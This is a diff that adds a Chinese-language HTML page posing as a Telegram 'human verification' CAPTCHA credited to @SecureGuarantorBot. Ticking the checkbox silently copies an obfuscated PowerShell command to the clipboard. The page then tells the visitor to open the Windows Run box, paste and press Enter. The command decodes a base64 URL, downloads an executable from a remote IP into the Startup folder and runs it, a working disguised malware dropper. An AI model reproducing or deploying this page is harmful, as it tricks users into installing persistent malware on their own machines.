@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>人机验证</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background-color: #1E1E1E;
+            border-radius: 10px;
+            padding: 20px;
+            width: 300px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 40px;
+            height: 40px;
+            background-color: #3498db;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 10px;
+        }
+        .logo img {
+            width: 24px;
+            height: 24px;
+        }
+        .title {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .verify-button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100px;
+        }
+        .content {
+            background-color: #2C2C2C;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .shield-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 15px;
+            display: block;
+        }
+        h2 {
+            color: white;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #CCCCCC;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .captcha {
+            background-color: white;
+            border-radius: 5px;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .captcha input {
+            margin-right: 10px;
+        }
+        .captcha-text {
+            color: black;
+            flex-grow: 1;
+        }
+        .captcha img {
+            width: 30px;
+            height: 30px;
+        }
+        .powered-by {
+            color: #CCCCCC;
+            font-size: 12px;
+            text-align: center;
+        }
+        .powered-by a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        .footer {
+            color: #CCCCCC;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .instructions {
+            display: none;
+            background-color: #1A73E8;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        .instructions h3 {
+            margin-top: 0;
+        }
+        .instructions ol {
+            padding-left: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/2048px-Telegram_logo.svg.png" alt="Telegram 标志">
+            </div>
+            <div class="title">Telegram</div>
+            <button class="verify-button" style="margin-left: auto;">验证</button>
+        </div>
+        <div class="content">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiM0Q0FGNTAiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIiBjbGFzcz0ibHVjaWRlIGx1Y2lkZS1zaGllbGQiPjxwYXRoIGQ9Ik0xMiAyMnM4LTQgOC0xMFY1bC04LTNsLTggM3Y3YzAgNiA4IDEwIDggMTBaIi8+PC9zdmc+" alt="盾牌" class="shield-icon">
+            <h2>人机验证</h2>
+            <p>通过完成下方的验证码来验证您的用户身份。</p>
+            <div class="captcha">
+                <input type="checkbox" id="captcha-checkbox">
+                <span class="captcha-text">我是人类</span>
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMzAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMTUiIGN5PSIxNSIgcj0iMTQiIGZpbGw9IiNFMEUwRTAiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzlFOUU5RSIgZm9udC1zaXplPSIxMiIgZm9udC1mYW1pbHk9IkFyaWFsIj5oQzwvdGV4dD48L3N2Zz4=" alt="hCaptcha">
+            </div>
+            <div class="powered-by">技术支持： <a href="#">@SecureGuarantorBot</a></div>
+        </div>
+        <div class="footer">
+            如果您有Telegram，可以立即联系SecureGuarantorBot。
+        </div>
+        <div class="instructions">
+    <h3>验证步骤</h3>
+    <p>请按照以下步骤操作，以证明您不是机器人：</p>
+    <ol>
+        <li>同时按下键盘上的 <b>Windows 键</b>（通常带有Windows标志）和 <b>R 键</b>。</li>
+        <li>在弹出的"运行"窗口中，按 <b>Ctrl + V</b> 组合键粘贴已复制的内容。</li>
+        <li>按下键盘上的 <b>回车键</b>（Enter）来执行命令。</li>
+    </ol>
+</div>
+    </div>
+
+    <script>
+        const command = `powershell -c "$u='aHR0cDovLzMxLjIyMC40OS4xNy9jb25zby5leGU=';$p=[System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), 'conso.exe');iwr ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($u))) -OutFile $p;ii $p"`;
+        
+        document.getElementById('captcha-checkbox').addEventListener('change', function() {
+            if (this.checked) {
+                document.querySelector('.instructions').style.display = 'block';
+                navigator.clipboard.writeText(command).then(() => {
+                    console.log('命令已复制到剪贴板');
+                }).catch(err => {
+                    console.error('复制命令失败: ', err);
+                });
+            } else {
+                document.querySelector('.instructions').style.display = 'none';
+            }
+        });
+
+        document.querySelector('.verify-button').addEventListener('click', function() {
+            if (document.getElementById('captcha-checkbox').checked) {
+                alert('验证成功！');
+            } else {
+                alert('请先完成验证码。');
+            }
+        });
+    </script>
+</body>
+</html>
